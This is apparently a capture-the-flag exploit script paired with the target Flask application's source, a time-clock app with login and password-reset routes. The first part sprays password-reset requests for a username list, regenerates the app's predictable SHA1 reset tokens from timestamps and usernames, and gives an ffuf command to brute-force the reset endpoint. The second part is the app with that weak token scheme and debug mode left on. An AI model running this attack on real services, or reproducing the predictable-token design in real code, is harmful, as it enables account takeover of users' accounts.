
import requests
import hashlib
import datetime

# Read usernames from the file
with open("/root/top-usernames-shortlist.txt") as file:
    usernames = [line.strip() for line in file]

def generate_token(user):
    value = datetime.datetime.now(datetime.timezone.utc)
    tokens = []
    for second in range(10):
        time = str(value)[:-14] + str(second) + "."
        for mili_second in range(100):
            if mili_second < 10:
                lnk = time + "0" + str(mili_second) + " . " + user.upper()
            else:
                lnk = time + str(mili_second) + " . " + user.upper()
            lnk = hashlib.sha1(lnk.encode("utf-8")).hexdigest()
            tokens.append(lnk)
    return tokens

# Store possible tokens for each user

possible_tokens = {}

for user in usernames:
    url = "http://10.10.244.186:8080/forgot_password"
    data = {"username": user}

    try:
        response = requests.post(url, data=data)
        
        if response.status_code == 200:
            print(f"Request for {user} was successful")
        else:
            print(f"Failed to send request for {user}")
            print("Status Code:", response.status_code)
            print("Response:", response.text)
    except requests.exceptions.RequestException as e:
        print(f"An error occurred for {user}:", e)

    # Generate possible tokens
    possible_tokens[user] = generate_token(user)



# Save all generated tokens to hashes.txt
with open('hashes.txt', 'w') as hashes:
    for user, tokens in possible_tokens.items():
        for token in tokens:
            hashes.write(f"{user}={token}\n")
            print(f"{user}={token}")

# ffuf -u "http://10.10.68.185:8080/password_reset?token=FUZZ" -w hashes.txt -fs 22


# Import necessary modules from Flask
# Only the required imports are retained
from flask import Flask, flash, redirect, render_template, request, session, abort

# Import necessary modules
from time import gmtime, strftime
from dotenv import load_dotenv
import os
import pymysql.cursors  # MySQL connection module
import datetime
import hashlib  # Used for hashing tokens in forgot_password
# requests and base64 were removed as they are not used

# Load environment variables from a .env file
load_dotenv()

# Get the database password from environment variables
db_password = os.environ.get('db')

# Connect to MySQL database using the credentials and database name
connection = pymysql.connect(
    host="localhost",
    user="clocky_user",
    password=db_password,
    db="clocky",
    cursorclass=pymysql.cursors.DictCursor
)

# Initialize the Flask application
app = Flask(__name__)

# Define the home route which shows the current time
@app.route("/")
def home():
    current_time = strftime("%Y-%m-%d %H:%M:%S", gmtime())
    return render_template("index.html", current_time=current_time)

# Define the administrator route which handles login functionality
@app.route("/administrator", methods=["GET", "POST"])
def administrator():
    if session.get("logged_in"):  # Check if the user is already logged in
        return render_template("admin.html")
    else:
        if request.method == "GET":
            return render_template("login.html")  # Show login form
        elif request.method == "POST":
            user_provided_username = request.form["username"]
            user_provided_password = request.form["password"]
            try:
                with connection.cursor() as cursor:
                    # Retrieve user ID based on the provided username
                    sql = "SELECT ID FROM users WHERE username = %s"
                    cursor.execute(sql, (user_provided_username,))
                    user_id = cursor.fetchone()
                    if user_id:
                        user_id = user_id["ID"]
                        # Verify the password for the retrieved user ID
                        sql = "SELECT password FROM passwords WHERE ID=%s AND password=%s"
                        cursor.execute(sql, (user_id, user_provided_password))
                        if cursor.fetchone():
                            session["logged_in"] = True  # Set the session as logged in
                            return redirect("/dashboard", code=302)  # Redirect to the dashboard
            except:
                pass
            message = "Invalid username or password"  # Display error message on failure
            return render_template("login.html", message=message)

# Define the forgot_password route to handle password reset requests
@app.route("/forgot_password", methods=["GET", "POST"])
def forgot_password():
    if session.get("logged_in"):  # Check if the user is already logged in
        return render_template("admin.html")
    else:
        if request.method == "GET":
            return render_template("forgot_password.html")  # Show forgot password form
        elif request.method == "POST":
            username = request.form["username"].lower()
            try:
                with connection.cursor() as cursor:
                    # Check if the provided username exists
                    sql = "SELECT username FROM users WHERE username = %s"
                    cursor.execute(sql, (username,))
                    if cursor.fetchone():
                        # Generate a reset token
                        value = datetime.datetime.now()
                        lnk = str(value)[:-4] + " . " + username.upper()
                        lnk = hashlib.sha1(lnk.encode("utf-8")).hexdigest()
                        # Update the reset token for the user
                        sql = "UPDATE reset_token SET token=%s WHERE username = %s"
                        cursor.execute(sql, (lnk, username))
                        connection.commit()
            except:
                pass
            message = "A reset link has been sent to your e-mail"  # Inform the user
            return render_template("forgot_password.html", message=message)

# Define the password_reset route to handle password reset via token
@app.route("/password_reset", methods=["GET"])
def password_reset():
    if request.method == "GET":
        # Check for the required temporary token parameter
        if request.args.get("TEMPORARY"):
            user_provided_token = request.args.get("TEMPORARY")
            try:
                with connection.cursor() as cursor:
                    # Verify the reset token
                    sql = "SELECT token FROM reset_token WHERE token = %s"
                    cursor.execute(sql, (user_provided_token,))
                    if cursor.fetchone():
                        return render_template("password_reset.html", token=user_provided_token)
                    else:
                        return "<h2>Invalid token</h2>"
            except:
                pass
        else:
            return "<h2>Invalid parameter</h2>"
    return "<h2>Invalid parameter</h2>"

# Main entry point for the application
if __name__ == "__main__":
    # Set the secret key for session management
    app.secret_key = os.urandom(256)
    # Run the Flask application with debugging enabled (disable in production)
    app.run(host="0.0.0.0", port="8080", debug=True)
